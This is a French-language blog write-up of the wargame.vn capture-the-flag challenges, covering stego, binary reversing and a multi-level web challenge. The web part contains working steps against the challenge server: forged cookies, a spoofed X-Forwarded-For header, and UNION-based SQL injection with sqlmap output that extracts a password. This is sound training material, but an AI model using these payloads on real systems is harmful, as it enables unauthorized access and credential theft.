---
layout: post
title: "CTF wargamevn writeups"
description: "Un CTF organisé par des vietnamiens, vive google translate ;)"
categories: articles
tags: [hacking]
comments: true
---

## Stegano 50

>11216311219611#9632969363
>Flag được viết bằng chữ in thường, không có dấu cách (space)

Google translate nous permet de comprendre que le flag attendu est en minuscule et qu'il n'y a pas d'espace. Le texte fait penser à une technique qui consiste à coder le message en utilisant les touches d'un téléphone portable[^1]. 

Pas de chance, cela ne semble pas être la méthode utilisée dans ce cas là, tant pis on va faire un petit tour sur [google](https://www.google.com/search?q=11216311219611%239632969363). Le premier résultat retourné nous amène sur une [vidéo](http://www.youtube.com/watch?v=WKrfEFf6C2I) qui nous explique comment faire de la musique avec son portable.

En fouillant dans les commentaires on tombe sur notre message "codé":

>To play happy birthday on an iphone press these buttons: 11216311219611#9632969363

Et effectivement le flag est bien: happybirthday

## Bin 50

Bon alors pour celui là j'y suis allé à l'intuition :P

On se retrouve avec un fichier binaire, comme le reverse et l'ASM c'est pas encore mon fort je sors IDA et je génère le pseudo-code C de la routine principale.

{% highlight c %}
int __cdecl main(signed int a1, int a2)
{
  int v3; // [sp+14h] [bp-Ch]@3
  signed int i; // [sp+18h] [bp-8h]@17
  int v5; // [sp+1Ch] [bp-4h]@1

  v5 = *(_DWORD *)(a2 + 4);
  if ( a1 > 1 ){
    v3 = *(_BYTE *)v5;
    if ( strcmp((const char *)&v3, L"w@R6me") )
      return 0;
    ++v5;
    v3 = *(_BYTE *)v5;
    if ( strcmp((const char *)&v3, L"") )
      return 0;
    ++v5;
    v3 = *(_BYTE *)v5;
    if ( strcmp((const char *)&v3, L"@R6me") )
      return 0;
    ++v5;
    v3 = *(_BYTE *)v5;
    if ( strcmp((const char *)&v3, L"") )
      return 0;
    ++v5;
    v3 = *(_BYTE *)v5;
    if ( strcmp((const char *)&v3, L"") )
      return 0;
    ++v5;
    v3 = *(_BYTE *)v5;
    if ( strcmp((const char *)&v3, L"R6me") )
      return 0;
    ++v5;
    v3 = *(_BYTE *)v5;
    if ( strcmp((const char *)&v3, L"") )
      return 0;
    ++v5;
    printf("HERE IS YOUR FLAG: ");
    for ( i = 0; i <= 27; ++i )
      putchar((i + 1) ^ flag[i]);
  }
  else{
    printf("%s <keystring>\n", *(_DWORD *)a2);
  }
  return 0;
}
{% endhighlight %}

Alors on voit qu'un certain nombre de tests sont fait sur la chaine passée en argument, si on regarde le premier test on voit qu'une comparaison est faite avec la chaine `w@R6me` ce qui ressemble fortement à la chaine `wargame` version "l33t". 

On test pour voir:

>techbrunch@blog:~/541490 (master) $ ./go w@R6@me                                                                                                                                                  
>HERE IS YOUR FLAG: teaser_simplecrackshouldwork

et paf le Flag :)

## Web 50

{% highlight php %}
<?php
error_reporting(0);
$flag = file('../../flag.txt');
if ($_GET['x']==="\x01\x03\x03\x07")
    echo $flag[0];
?>
{% endhighlight %}

Solution : http://challenges.wargame.vn:1337/web50_4e4d6c332b6fe62a63afe56171fd3725/?x=%01%03%03%07
Flag : teaser_web50_is_easy:)

## Web 100

Le web 100 était constitué d'une série de 7 niveaux.

### Level 1

Premier niveau on arrive sur la page et un message s'affiche:

>It works

On jette un coup d'oeil au code source:

{% highlight html %}
<html><h1>It works</h1></html>
[...]
<!-- next: level2.php -->
{% endhighlight %}

et on trouve le lien pour le niveau 2.

## Level 2

Cette fois ci le message est différent:

>You're not logged in!

Cette fois ci rien d'intéressant dans le code de la page. On va s'intéresser aux en-tête et plus particulièrement à la réponse envoyé par le serveur:

    Connection:Keep-Alive
    Content-Encoding:gzip
    Content-Length:41
    Content-Type:text/html
    Date:Fri, 26 Jul 2013 15:48:33 GMT
    Keep-Alive:timeout=5, max=100
    Server:Apache/2.2.22 (Ubuntu)
    Set-Cookie:login=0; expires=Thu, 01-Jan-1970 00:00:01 GMT
    Vary:Accept-Encoding
    X-Powered-By:PHP/5.4.6-1ubuntu1.3

Apparement il nous faut un cookie login que l'on va setter à 1.

{% highlight ruby %}
require 'uri'
require 'net/http'

uri = URI("http://challenges.wargame.vn:1337");
http = Net::HTTP.new(uri.host, uri.port)
headers = {
    'Cookie' => 'login=1'
}

puts http.get('http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/level2.php', headers).body
{% endhighlight %}

On exécute le srcipt  et direction le level 3:

    techbrunch@yop:~/562394 $ ruby level2.rb
    <h1>Ops!</h1><!-- l3v3l_3.php -->
    techbrunch@yop:~/562394 $

## Level3

Même message qu'au niveau 2:

>You're not logged in!


    Set-Cookie:login=96.29.172.198; expires=Thu, 01-Jan-1970 00:00:01 GMT

Cette fois ci le cookie doit contenir une adresse ip, et un commentaire dans le code de la page nous laisse supposer qu'il que que l'adresse ip soit `127.0.0.1`.

{% highlight ruby %}
require 'uri'
require 'net/http'

uri = URI("http://challenges.wargame.vn:1337");
http = Net::HTTP.new(uri.host, uri.port)
headers = {
    'Cookie' => 'login=127.0.0.1'
}

puts http.get('http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/l3v3l_3.php', headers).body
{% endhighlight %}

    techbrunch@yop:~/562394 $ ruby level3.rb
    <!-- 127.0.0.1 -->
    <h1>Ops!</h1><!-- l3v3l___4.php -->

## Level 4

Pour le level 4 on se retrouve avec un commentaire qui laisse penser qu'un header http spécifique doit être présent pour passer au niveau suivant. 

{% highlight html %}
<!-- if($_SERVER['HTTP_1337']=='1337') -->
Array
(
    [HTTP_HOST] => challenges.wargame.vn:1337
    [...] => ...
    [REQUEST_TIME] => 1374854460
)
{% endhighlight %}

On modifie notre script précédent et c'est reparti:

{% highlight ruby %}
require 'uri'
require 'net/http'

uri = URI("http://challenges.wargame.vn:1337");
http = Net::HTTP.new(uri.host, uri.port)
headers = {
    '1337' => '1337'
}

puts http.get('http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/l3v3l___4.php', headers).body
{% endhighlight %}


    techbrunch@yop:~/562394 $ ruby level4.rb
    <!-- if($_SERVER['HTTP_1337']=='1337') -->
    Array
    (
        [HTTP_1337] => 1337
        [...] => ...
        [REQUEST_TIME] => 1374854625
    )
    <h1>Ops!</h1><!-- level_$5.php -->
    techbrunch@yop:~/562394 $

## Level5

Cette fois ci il semblerait qu'un filtrage soit effectué en fonction de l'adresse ip:

{% highlight html %}
<!-- if($ip="127.0.0.1") fet lag(); -->
Array
(
    [HTTP_HOST] => challenges.wargame.vn:1337
    [...] => ...
    [REQUEST_TIME] => 1374854684
)
<br /><br />Your IP: <strong>96.29.172.198</strong><br />You're not an admin! Get out X-(
{% endhighlight %}

Le script semble reposer sur les header http pour récupéré l'adresse ip. On va donc ajouté un header `X_FORWARDED_FOR` pour faire croire au script que notre adresse ip est `127.0.0.1`.

{% highlight ruby %}
require 'uri'
require 'net/http'
 
uri = URI("http://challenges.wargame.vn:1337");
http = Net::HTTP.new(uri.host, uri.port)
headers = {
    'X_FORWARDED_FOR' => '127.0.0.1'
}
 
puts http.get('http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/level_$5.php', headers).body
{% endhighlight %}

    techbrunch@yop:~/562394 $ ruby level5.rb
    <!-- if($ip="127.0.0.1") flag(); -->
    Array
    (
        [HTTP_X_FORWARDED_FOR] => 127.0.0.1
        [...] => ...
        [REQUEST_TIME] => 1374854949
    )
    <br /><br />Your IP: <strong>127.0.0.1</strong><br /><h1>Ops!</h1><!-- lev3l_$6_.php -->
    techbrunch@yop:~/562394 $

## Level 6

Cette fois-ci c'est un message de bienvenue qui s'affiche:

>Hello manhluat!

L'url est plus intéressante que les fois précédante et ça sent l'injection SQL à plein nez:

    http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=1
    http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=-1
    http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=-1 or 1=2--
    http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=-1 or 1=1--

Le message de bienvenue ne s'affiche qu'avec la première et la dernière URL ce qui confirme que nous somme en présence d'une faille de type injection SQL.

On va cherche le nombre de colonne de la requête:

    http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=1 order by 3-- OK
    http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=1 order by 4-- NOK
    
Le select se fait sur 3 colonnes.

    http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=-1 union select 1,2,3--
    
>Hello 2!

Le nom d'utilisateur est la deuxième colonne sélectionnée. 

Pour le fun un petit coup de SQLmap :

    c:\Python27>python.exe "c:\Program Files\sqlmap\sqlmap.py" -u http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=1 --technique=U --union-cols=3 -T users --common-columns"

    [19:32:58] [INFO] retrieved: id
    [19:32:59] [INFO] retrieved: username
    [19:33:01] [INFO] retrieved: rowid
    [19:33:07] [INFO] tried 179/2447 items (7%)
    [19:33:07] [INFO] waiting for threads to finish (Ctrl+C was pressed)
    [19:33:08] [WARNING] user aborted during column existence check. sqlmap will dis
    play partial output

    Database: All
    Table: users
    [3 columns]
    +----------+---------+
    | Column   | Type    |
    +----------+---------+
    | id       | numeric |
    | rowid    | numeric |
    | username | numeric |
    +----------+---------+
    
On sait désormais le nom des trois colonnes utilisées.

    http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=1-1 union select 1,(select count(*) from users),3--

>Hello 2!

Il y a deux utilisateurs dans la table users, le flag est donc surement le mot de passe de l'autre utilisateur.

    http://challenges.wargame.vn:1337/web100_d6da263d82cd07bd02cecf82f2b666b7/lev3l_$6_.php?id=1-1 union select 1,(select password from users where id<>1),3--

>Hello $level7_.php!

Bingo !

Bon je me suis arrêté là par manque de temps et de motivation mais c'était fun quand même.

[^1]: [SMS Text Message Decoder](http://www.dbcovers.com/image-of-half-nelson-2006-half_nelson_2006_1)

